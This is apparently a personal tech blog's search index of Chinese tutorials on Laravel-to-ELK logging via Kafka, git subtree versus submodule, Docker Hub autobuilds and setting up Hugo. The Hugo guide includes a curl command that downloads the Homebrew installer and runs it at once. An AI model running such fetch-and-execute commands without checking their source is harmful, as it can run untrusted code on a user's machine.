output Kibana: 視覺化 elasticsearch 資料的網頁服務 如果有點進去連結的人會發現根本就是同一間公司的產品啊！！\n\u0026hellip;是的沒錯，市面上類似的競爭者還有 Graylog\nkafka 是什麼 由 Apache 基金會維護的 MQ(Message Queue) 服務，看到 Apache 這幾個字基本上就放心地使用吧\n專有名詞簡述 名詞 說明 broker 每個群集都會有 1toN 個服務器，這個服務器被稱作 broker topic 每條訊息所屬的類別(物理上分開儲存) partition 物理上的概念，每個topic有 1toN 個topic producer 訊息生產者 consumer 訊息接收者 consumer group 每個 consumer 屬於一個 group，可作群組訊息管理 大概有個概念就行了\nInstall ELK+Kafka 這裡用docker-compose安裝\n先把庫抓下來git clone https://github.com/wurstmeister/kafka-docker.git 修改docker-compose-single-broker.yml如下 version: \u0026#39;3\u0026#39; services: zookeeper: image: wurstmeister/zookeeper ports: - \u0026#34;2181:2181\u0026#34; container_name: local_zp kafka: build: . ports: - \u0026#34;9092:9092\u0026#34; environment: KAFKA_ADVERTISED_HOST_NAME: local_kafka # kafka command 啟動時的 hostname KAFKA_CREATE_TOPICS: \u0026#34;localtest\u0026#34; KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181 volumes: - /var/run/docker.sock:/var/run/docker.sock container_name: local_kafka elk: image: sebp/elk ports: - \u0026#39;5601:5601\u0026#39; - \u0026#39;9200:9200\u0026#39; - \u0026#39;5044:5044\u0026#39; container_name: local_elk 啟動容器docker-compose -f docker-compose-single-broker.yml up 設定 logstash conf 進入 local_elk container 並增加 logstash 接收 kafka 訊息的設定如下\ninput { kafka { bootstrap_servers =\u0026gt; \u0026#34;local_kafka:9092\u0026#34; topics =\u0026gt; [\u0026#34;localtest\u0026#34;] } } output { if [type] == \u0026#34;laravel\u0026#34; { elasticsearch { hosts =\u0026gt; \u0026#34;localhost:9200\u0026#34; index =\u0026gt; \u0026#34;laravel-%{+YYYY.MM.dd}\u0026#34; } } } 完成後重啟 logstash service logstash restart\n需要注意的地方是 bootstrap_servers 與 KAFKA_ADVERTISED_HOST_NAME 要一致，不然 logstash 會找不到\nlaravel 寫些什麼 安裝套件composer require nmred/kafka-php 繼承 laravel logger \u0026lt;?php namespace App\\Hubs; use Monolog\\Handler\\AbstractProcessingHandler; class KafkaLogHubber extends AbstractProcessingHandler { public function __construct() { $this-\u0026gt;bubble = false; } protected function write(array $record) { $config = \\Kafka\\ProducerConfig::getInstance(); $config-\u0026gt;setMetadataRefreshIntervalMs(10000); $config-\u0026gt;setMetadataBrokerList(\u0026#39;127.0.0.1:9092\u0026#39;); $config-\u0026gt;setBrokerVersion(\u0026#39;2.1.0\u0026#39;); $config-\u0026gt;setRequiredAck(1); $config-\u0026gt;setIsAsyn(false); $config-\u0026gt;setProduceInterval(500); $producer = new \\Kafka\\Producer(); $producer-\u0026gt;send([ [ \u0026#39;topic\u0026#39; =\u0026gt; \u0026#39;logstash\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $record[\u0026#39;formatted\u0026#39;], \u0026#39;key\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ], ]); } protected function getDefaultFormatter() { // setup formatter (default use LineFormatter) return new \\Monolog\\Formatter\\LogstashFormatter; } } 修改預設的 logger 為 KafkaLogHubber \u0026lt;?php // in bootstrap/app.php ... $app-\u0026gt;configureMonologUsing(function ($monolog) { $monolog-\u0026gt;pushHandler(new \\App\\Hubs\\KafkaLogHubber); }); ... return $app; 之後在任何地方使用 \\Illuminate\\Support\\Facades\\Log 都會寫到 kafka 裡面拉\n要查看結果有兩個方法\n使用 kibana: localhost:5601即可 使用 kafka tool: 使用這個方法的人記得修改/etc/hosts讓本地可以認識local_kafka這個 domain 補充說明 範例使用laravel5.5, 5.6+ 的 logging 更加彈性，可擴充至 custom channel 進而保留原始的 logging 要直接測試 kafka 參考 kafka-php github Reference logstash examples laravel 使用 kafka 寫入 log ","permalink":"http://shachiku.life/2018/12/laravel-log-to-elk-via-kafka/","summary":"就像在烤肉時，把雞肉、青椒以及杏苞姑串再一起的概念","title":"將 laravel log 透過 kafka 送入 ELK"},{"contents":"最近架設 hugo 時查詢的資料發現有使用git subtree跟git submodule兩種抓 theme 的方法，研究後把差別記錄在這\n主要差異 submodule: 適合不需對 sub repo 進行 push 的動作時使用\nsubtree: 適合需要把 master repo 的某些 feature 獨立成一個 git branch 時使用\nsubtree concept\n把整個外部 repo 以及 commit log 拷貝到新的 repo 中，如同名稱一樣，就是「子樹」的概念，可把它視為完全獨立於 master repo 底下的 repo init remote as subtree: git remote add {remote-name} {remote repo} + git subtree add -P {localModulePath} {remote-name} {ref branch} local as subtree: git subtree split -P {localModulePath} -b {ref branch} delete\n只需刪除新增的 branch 即可 push / pull\n用法就跟一般的push / pull一樣，差別在於多了 subtree，e.g: git subtree push -P {localModulePath} {repository} {ref branch} submodule concept\n建立與外部 repo 的 HEAD commit 連結，但由於僅是連結，要進行 push 的話會比較複雜，因此較適合使用的 repo 本身僅需維持在某特定版本的情境\ninit\n完成後會出現.gitmodules檔案，內容紀錄 submodule 相關的 ref，記得先 commit\n不指定 branch: git submodule add {remote repo} {localpath} 指定 branch: git submodule add -b {branch} {remote repo} {localpath} delete\n有兩種方法\ngit rm --cached {localpath} + .git/config + .gitmodules git submodule deinit {localpath} + git rm {localpath} push\ncd /path/to/submodule git checkout master git commit -am \u0026#39;commit msg\u0026#39; git push origin master # push 完 submodule 之後 root 層會多一個 unstaged 的 change # 內容是 submodule 的 hash 改變 # 因此要回到 root 多進行一次 push 才能確保專案正常 cd /path/to/root git commit -am \u0026#39;commit msg\u0026#39; git push origin master pull\ngit submodule update --init or git submodule init + git submodule update\nReference https://stackoverflow.com/questions/31769820/differences-between-git-submodule-and-subtree https://hexo.crboy.net/2016/09/amazing-git-subtree/ http://yutin.logdown.com/posts/188306-git-subtree-total-addendum-library https://stackoverflow.com/questions/5814319/git-submodule-push ","permalink":"http://shachiku.life/2018/12/difference-between-subtree-and-submodule/","summary":"subtree or submodule? that is a question.","title":"git 管理子庫的兩種方式"},{"contents":"Docker hub 本身有提供 autobuild trigger，只需透過UI設定與github連動即可做到使用git branch進行docker file的管理，以下分別列出Github與Docker hub需要的設定\nGithub 這裡的 branch 會對應到 Docker hub 的 tag\n建立 github repo，命名為 dockerfile clone 到本地後建立新的分支，命名使用自己喜歡的方式命名，e.g: centos7-autotagging 於分支底下建立Dockerfile並撰寫內容 寫好後docker build . -t 'local-centos7-autotagging' 測試 build (加上 -t 是讓 local 方便操作) build通過後git push origin centos7-autotagging建立並推送至遠端分支 Docker hub 這裡的 tag 會對應到 github 的 branch\n建立repo 選擇剛剛建立好的 repository，如果沒連接 github 帳號會要求進行連接 連接完畢並建立 repo 即可 如有設定好連動即可自動推送並建置image，結果如圖) 之後要拉自己的環境時只需要docker pull {username}/{repo name}:{tagname}即可\n搭配 docker-compose 更方便，可參考我的**範例**\n","permalink":"http://shachiku.life/2018/12/use-github-to-manage-your-docker-image/","summary":"列出使用 github 管理 dockerhub 時需要做的步驟","title":"使用 Github 管理 Docker image"},{"contents":"Step1. install hugo install homebrew\n/usr/bin/ruby -e \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\u0026#34; then install hugo\nbrew install hugo Step2. start a hugo project make your project folder\nhugo new site your_blog cd your_blog Step3. add theme you can find more themes here\nmkdir themes # use git clone git clone https://github.com/josephhutch/aether.git themes/aether # use git submodule(recommend) git submodule add https://github.com/josephhutch/aether.git themes/aether enable theme\nvim config.toml # add new line theme = \u0026#34;aether\u0026#34; Step4. add post hugo new posts/first-post.md change draft: true then run hugo server -w for local test\nStep5. publish to github Because this is my personal website, so I use User/Organization Pages\ncreate {your-project} repo on your github\ncreate {username}.github.io repo on your github\nadd github page to submodule git submodule add -b master git@github.com:{username}/{username}.github.io.git public(you can use https as git url too)\nadd shell to project folder, named deploy.sh\n#!/bin/bash echo -e \u0026#34;\\033[0;32mDeploying updates to GitHub...\\033[0m\u0026#34; # Build the project. hugo # if using a theme, replace with `hugo -t \u0026lt;YOURTHEME\u0026gt;` # Go To Public folder cd public # Add changes to git. git checkout master git add . # Commit changes. git commit -m \u0026#34;rebuilding site `date`\u0026#34; # Push source and build repos. git push origin master # Come Back up to the Project Root cd .. msg=\u0026#34;updated at `date`\u0026#34; if [ $# -eq 1 ] then msg=\u0026#34;$1\u0026#34; fi git add . git commit -m \u0026#34;$msg\u0026#34; git push origin master run git commit -am \u0026quot;yout website-hugo commit message \u0026quot; then git push origin master\ndeploy to {yourname}.github.io with ./deploy.sh \u0026quot;your commit message\u0026quot;\nReference hosting hugo on github 在github部署hugo靜態網站 ","permalink":"http://shachiku.life/2018/12/hugo-installation/","summary":"簡單介紹安裝hugo的方法，mac only","title":"Hugo安裝"},{"contents":"interests 🛹 🌊 ⛰ ✈️ 📈\nskills Backend: php, node, python Frontend: Vue, jQuery Devops: docker, GCP, k8s Linux: centos, ubuntu VCS: git Database: MySQL, PostgreSQL, redis contact whccchi@gmail.com\n","permalink":"http://shachiku.life/about/","summary":null,"title":"About"},{"contents":"2023 Mar 11 \u0026ndash; 如何限制 python json api 格式\nMar 08 \u0026ndash; [推薦] 系統設計面試時的思考框架\nMar 07 \u0026ndash; [推薦] 程式設計師最不該做的事\nMar 06 \u0026ndash; Disable sqlmodel foreign key constraint\nMar 04 \u0026ndash; [推薦] 如何在沒有 mentor 的情況下自學成才\nMar 04 \u0026ndash; [推薦] Function Programing 的基礎觀念\nJan 08 \u0026ndash; [推薦]少用繼承，多用 composition\nJan 04 \u0026ndash; 使用 python 模擬 laravel filesystem\n2022 Dec 25 \u0026ndash; [推薦] auth 沒你想像的複雜\nDec 20 \u0026ndash; [推薦] Parse Don't Validate\nDec 16 \u0026ndash; Setup FastAPI Debugger in VSCode With Docker\nDec 16 \u0026ndash; Setup FastAPI Debugger in PyCharm With Docker\nDec 03 \u0026ndash; If Web Development Is a Poetry\nNov 22 \u0026ndash; [寓言故事] When to Use Mock\nNov 18 \u0026ndash; [推薦]物件導向的 SOLID 原則\nNov 05 \u0026ndash; [推薦]為何預估這麼困難\nOct 19 \u0026ndash; 發 Pull Request 的正確姿勢\nOct 07 \u0026ndash; 在 mac os 12.6 上安裝 ruby 2.6\nSep 07 \u0026ndash; 在 docker 中設定自定義的 redis config\nSep 06 \u0026ndash; 使用 ssh 連入 Docker 中的 PostgreSQL\nJul 26 \u0026ndash; [推薦] 成為專家的心態\nJul 26 \u0026ndash; [推薦]如何找到開源專案貢獻\nJul 10 \u0026ndash; [推薦]分布式系統的 8 個謬誤\nJul 04 \u0026ndash; [推薦] 過早最佳化是萬惡的根源\nJul 02 \u0026ndash; [推薦] Mysql Lock Index and Deadlock\nJun 07 \u0026ndash; [推薦] What Is Api Gateway\nJun 06 \u0026ndash; [推薦] Mock Database or Not\nMar 11 \u0026ndash; Facebook 應用程式審查要點\n2021 Nov 22 \u0026ndash; Skateboard 各種站位\nSep 17 \u0026ndash; 透過 GTM 綁定客製事件到 GA4\nAug 26 \u0026ndash; 使用 Burp Suite 進行封包竄改\nAug 05 \u0026ndash; Tilde(~) vs Caret(^) in composer\nJul 22 \u0026ndash; 玩玩 Drone CI\nJul 09 \u0026ndash; [From medium]天下雜誌 2020 總統大選專題-技術紀錄\nJul 09 \u0026ndash; [From medium]Elasticsearch 中文同義詞與自動完成\nJul 08 \u0026ndash; 設定 GA4 與 GTM\nJul 05 \u0026ndash; 綁定 domain 給 github page\nJun 07 \u0026ndash; [翻譯]Best practices for writing Dockerfiles\nMay 25 \u0026ndash; 韭菜成長心得（1）\nJan 26 \u0026ndash; Ethereum POA 架設\n2020 Dec 22 \u0026ndash; Docker Compose yml 小技巧\nDec 16 \u0026ndash; Skateboard Kickturn\nDec 16 \u0026ndash; 在 Hugo 中加入 js library\nDec 16 \u0026ndash; 善用 lru_cache 對設定檔進行 cache\nDec 10 \u0026ndash; 在 github 上多帳號與多組 ssh key 使用\nDec 10 \u0026ndash; Docker Create Redis Sentinel\nNov 15 \u0026ndash; Skateboard Category\nAug 06 \u0026ndash; 雜談（4）\nJul 27 \u0026ndash; Mongodb 讀寫分離\nJun 16 \u0026ndash; 在 laravel 中使用第三方登入並整合 Auth Facade\nJun 11 \u0026ndash; Avro to Hbase using Apache Beam\nMay 31 \u0026ndash; 雜談（3）\nMay 25 \u0026ndash; 安裝 Hbase\nMay 17 \u0026ndash; 雜談（2）\nMay 14 \u0026ndash; 在 vscode 中設定 docker xdebug\nMay 06 \u0026ndash; 轉存 gsheet 成 pdf 並存入 google drive\nApr 22 \u0026ndash; 雜談（1）\nApr 22 \u0026ndash; 設定 Elasticsearch 自動完成\nMar 12 \u0026ndash; Difference Between Bind and Singleton\nFeb 11 \u0026ndash; Laravel Model 使用非預設主鍵\nJan 31 \u0026ndash; 在 docker 上跑 laravel-dusk\nJan 07 \u0026ndash; 把 gsheet 當作 json api 使用\n2019 Nov 21 \u0026ndash; Intro to Microsoft Application Insights\nOct 15 \u0026ndash; 設定 elasticsearch 同義詞\nSep 05 \u0026ndash; 設定 solr 同義詞\nSep 05 \u0026ndash; Mac Connect to SQL Server\nJul 13 \u0026ndash; 部署laravel應用程式到GKE上\nJun 02 \u0026ndash; 安裝 fork 過來的 composer 套件\nMar 18 \u0026ndash; 開發並部署 laravel package 到 github 上\n2018 Dec 29 \u0026ndash; Hugo shortcodes With embed gist\nDec 29 \u0026ndash; 將 laravel log 透過 kafka 送入 ELK\nDec 21 \u0026ndash; git 管理子庫的兩種方式\nDec 19 \u0026ndash; 使用 Github 管理 Docker image\nDec 19 \u0026ndash; Hugo安裝\n","permalink":"http://shachiku.life/archives/","summary":null,"title":"Archives"},{"contents":"資料來源：https://dev.w3.org/html5/html-author/charref\nchar desc ascii unicode example ","permalink":"http://shachiku.life/tools/search-html-ascii/","summary":"","title":"HTML ascii 速查"},{"contents":"HTML ascii search\n","permalink":"http://shachiku.life/tools/","summary":null,"title":"Tools"}]